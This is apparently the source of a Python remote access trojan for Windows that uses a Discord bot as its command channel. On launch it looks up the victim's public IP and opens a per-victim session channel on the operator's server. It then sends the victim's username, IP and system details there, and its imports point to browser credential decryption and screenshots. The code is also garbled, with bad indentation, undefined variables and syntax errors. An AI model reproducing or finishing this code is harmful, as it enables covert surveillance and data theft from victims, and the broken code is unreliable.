# Imports
import os, discord, subprocess, requests, re, json, win32crypt, base64, shutil, sqlite3, winreg, configparser
from Crypto.Cipher import AES
from PIL import ImageGrab
from datetime import datetime
from discord import *

intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")
CWD = os.getcwd

# Read config file
    def load_config(file_path):
    config = configparser.ConfigParser()
    config.read(file_path)
    return config

# Assaign Variables
    config = load_config('config.cfg')
        serverid = config['Auth']['serverid']
        bottoken = config['Auth']['bottoken']
        role_id = config['Auth']['role_id']

# System Information
    
    # Get CPU
    def get_cpu():
        stdout = subprocess.Popen(
            ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
        ).stdout.read().decode()
        return stdout.split("\n")[3]

    # Get GPU
    def get_gpu():
        stdout = subprocess.Popen(
            ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
        ).stdout.read().decode()
        return stdout.split("\n")[3]

    # Get OS
    def get_os():
        stdout = subprocess.Popen(
            ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
        ).stdout.read().decode()
        return stdout.split("\n")[3]


# Bot Privileges 
    intents = discord.Intents.all()
    bot = discord.Client(intents=intents)

# Bot Command Prefix
    bot = commands.Bot(command_prefix='/')
    slash = SlashCommand(bot, sync_commands=True)

# On Bot start
@discord.bot.event
async def on_ready():

    # Get the IP
        ip_address = requests.get("https://api.ipify.org").text
        session_id = ip_address.replace('.','-')

    # Create Channel if Category exists
        guild = bot.get_guild(int(server_id))
        channel = await guild.create_text_channel(session_id):
        category_name = 'sessions'
        category = None
        for c in ctx.guild.categories:
            if c.name == category_name:
                category = c
                break

    # Create Category if not existing
        if category is None:
            category = await ctx.guild.create_category(category_name)
                    await category.set_permissions(role_id, read_messages=True, send_messages=True, read_message_histpry=True) 

    # Check if the Channel exists
        channel_name = session_id
        channel = None
        for c in category.channels:
            if c.name == channel_name:
                channel = c
                break

    # Create Channel if not existing
        if channel is None:
            channel = await category.create_text_channel(channel_name)
        else:
            await channel.send(embed=discord.Embed(description="reexecuted", color=discord.Color.yellow()))

# Embed on execute
    embed = discord.Embed(title="🧾 New session created 🧾", description="", color=0xfafafa)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=True)
    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
        sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

## Slash commands
    
    #Help Command
    @discord.slash_command(name="Help", description="Sends a list of all commands")
        if message.channel.name != session_id:
        return

        async def Help():
            await message.reply(embed=discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa))
    
    #Ping Command
    @discord.slash_command(name="Ping", description="Show the ping")
        if message.channel.name != session_id:
        return

        async def Ping():
            embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)
        
# Start the Bot
    bot.run(bottoken)
